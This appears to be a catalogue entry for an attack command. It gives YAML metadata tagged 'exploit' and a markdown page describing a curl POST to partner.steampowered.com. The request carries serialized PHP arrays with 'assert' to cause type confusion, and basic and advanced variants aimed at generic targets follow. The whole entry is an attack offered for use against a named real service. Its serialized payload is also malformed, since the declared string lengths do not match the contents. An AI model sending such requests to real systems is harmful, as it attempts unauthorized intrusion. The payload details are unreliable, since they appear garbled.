---
id: f6g7h8i9-j0k1-2345-fghi-678901234567
data: >-
  curl -X POST https://partner.steampowered.com/endpoint -d
  "function_name=array_diff_uassoc&param_types=array,array,string&param1=\"a:1:{s:6:\"0\";s:6:\"assert\"}\"
  &param2=\"b:1:{s:6:\"0\";s:6:\"assert\"}\" &param3=\"test\" " -v
tags:
  - exploit
  - php
  - curl
type: command
output: 'Response without type errors, showing coerced parameters.'
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:36.419Z'
verified: false
validated: true
submitted: true
---
# curl-manipulate-php-types

## Command

```bash
curl -X POST https://partner.steampowered.com/endpoint \
  -d "function_name=array_diff_uassoc&param_types=array,array,string&param1=\"a:1:{s:6:\"0\";s:6:\"assert\"}\" &param2=\"b:1:{s:6:\"0\";s:6:\"assert\"}\" &param3=\"test\" " \
  -v
```

## Description

Crafts a request to manipulate PHP array parameters into strings using serialization, targeting type confusion in function calls.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP POST method | Yes |
| `-d` | Encoded payload with serialized arrays | Yes |
| `-v` | Verbose mode | No |

## Examples

### Basic Usage

```bash
curl -X POST https://target/endpoint -d "function_name=array_diff_uassoc&param1=\"serialized\" " -v
```

### Advanced Usage

```bash
curl -X POST https://target/endpoint -d "function_name=array_diff_uassoc&param_types=array,array,string&param1=\"assert\" &param3=\"payload\" " -H "Content-Type: application/x-www-form-urlencoded" -v
```

## Expected Output

Server processes the request without PHP type errors, confirming manipulation success.

## Related

- [[Related Procedure: Manipulate-PHP-Array-Parameters-for-Type-Change]]
